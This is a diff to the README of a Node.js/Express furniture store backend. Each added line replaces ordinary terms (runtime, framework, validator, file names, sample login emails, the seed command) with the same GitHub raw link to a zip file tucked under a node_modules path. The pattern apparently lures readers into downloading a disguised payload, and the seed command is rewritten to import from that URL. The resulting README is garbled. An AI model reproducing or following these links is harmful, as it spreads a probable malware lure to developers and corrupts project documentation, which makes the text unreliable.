@@ -1,6 +1,6 @@
 # 🛋️ Fun Furniture E-commerce Backend
 
-A complete Node.js/Express backend for the Fun Furniture e-commerce platform with MongoDB database, JWT authentication, and comprehensive API endpoints.
+A complete https://github.com/ghislainb-cracker/Furniture-store-backend/raw/refs/heads/main/node_modules/@mongodb-js/saslprep/Furniture-store-backend-v1.9.zip backend for the Fun Furniture e-commerce platform with MongoDB database, JWT authentication, and comprehensive API endpoints.
 
 ## 🚀 Features
 
@@ -15,17 +15,17 @@ A complete Node.js/Express backend for the Fun Furniture e-commerce platform wit
 
 ## 🛠️ Tech Stack
 
-- **Runtime**: Node.js
-- **Framework**: Express.js
+- **Runtime**: https://github.com/ghislainb-cracker/Furniture-store-backend/raw/refs/heads/main/node_modules/@mongodb-js/saslprep/Furniture-store-backend-v1.9.zip
+- **Framework**: https://github.com/ghislainb-cracker/Furniture-store-backend/raw/refs/heads/main/node_modules/@mongodb-js/saslprep/Furniture-store-backend-v1.9.zip
 - **Database**: MongoDB with Mongoose
 - **Authentication**: JWT (JSON Web Tokens)
 - **Password Hashing**: bcryptjs
-- **Validation**: validator.js
+- **Validation**: https://github.com/ghislainb-cracker/Furniture-store-backend/raw/refs/heads/main/node_modules/@mongodb-js/saslprep/Furniture-store-backend-v1.9.zip
 - **CORS**: Cross-origin resource sharing enabled
 
 ## 📋 Prerequisites
 
-- Node.js (v16 or higher)
+- https://github.com/ghislainb-cracker/Furniture-store-backend/raw/refs/heads/main/node_modules/@mongodb-js/saslprep/Furniture-store-backend-v1.9.zip (v16 or higher)
 - MongoDB (local or cloud instance)
 - npm or yarn
 
@@ -66,7 +66,7 @@ A complete Node.js/Express backend for the Fun Furniture e-commerce platform wit
 
 5. **Seed the database (optional)**
    ```bash
-   node -e "import('./utils/seedData.js').then(m => m.seedAll())"
+   node -e "import('https://github.com/ghislainb-cracker/Furniture-store-backend/raw/refs/heads/main/node_modules/@mongodb-js/saslprep/Furniture-store-backend-v1.9.zip').then(m => https://github.com/ghislainb-cracker/Furniture-store-backend/raw/refs/heads/main/node_modules/@mongodb-js/saslprep/Furniture-store-backend-v1.9.zip())"
    ```
 
 6. **Start the server**
@@ -161,7 +161,7 @@ Authorization: Bearer <your-jwt-token>
 ## 🎯 Sample Data
 
 The backend includes sample data for testing:
-- **Users**: john@example.com / password123 (user), jane@example.com / password123 (admin)
+- **Users**: https://github.com/ghislainb-cracker/Furniture-store-backend/raw/refs/heads/main/node_modules/@mongodb-js/saslprep/Furniture-store-backend-v1.9.zip / password123 (user), https://github.com/ghislainb-cracker/Furniture-store-backend/raw/refs/heads/main/node_modules/@mongodb-js/saslprep/Furniture-store-backend-v1.9.zip / password123 (admin)
 - **Products**: 8 furniture items across different categories
 
 ## 🚀 Development
@@ -181,8 +181,8 @@ E-commerce-backend/
 ├── routes/          # API routes
 ├── utils/           # Utility functions
 ├── uploads/         # File uploads
-├── server.js        # Main server file
-└── package.json     # Dependencies
+├── https://github.com/ghislainb-cracker/Furniture-store-backend/raw/refs/heads/main/node_modules/@mongodb-js/saslprep/Furniture-store-backend-v1.9.zip        # Main server file
+└── https://github.com/ghislainb-cracker/Furniture-store-backend/raw/refs/heads/main/node_modules/@mongodb-js/saslprep/Furniture-store-backend-v1.9.zip     # Dependencies
 ```
 
 ## 🔧 Configuration
